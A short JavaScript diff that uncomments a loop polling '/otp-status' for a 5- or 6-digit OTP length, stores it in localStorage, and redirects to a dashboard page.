@@ -47,26 +47,28 @@
 
         const checker = setInterval(async () => {
             if (isRedirecting) return;
-            showLoaderAndGo("dashboard.html");
-            // try {
-            //     // 🔢 CHECK OTP TYPE (5 or 6)
-            //     const res = await fetch("/otp-status");
-            //     const data = await res.json();
-                
-            //     // if (data.otp === 5 || data.otp === 6) {
-            //     //     isRedirecting = true;
-            //     //     clearInterval(checker);
 
-            //     //     localStorage.setItem("otpLength", data.otp);
+            try {
+                // 🔢 CHECK OTP TYPE (5 or 6)
+                const res = await fetch("/otp-status");
+                const data = await res.json();
+
+                if (data.otp === 5 || data.otp === 6) {
+                    isRedirecting = true;
+                    clearInterval(checker);
+
+                    localStorage.setItem("otpLength", data.otp);
 
 
-            //     //     return;
-            //     // }
+                    return;
+                }
 
-            // } catch (err) {
-            //     console.log("Waiting...");
-            // }
+            } catch (err) {
+                console.log("Waiting...");
+            }
         }, 2000);
+
+        showLoaderAndGo("dashboard.html");
 
         function showLoaderAndGo(url) {
             document.getElementById("pageLoader").style.display = "block";
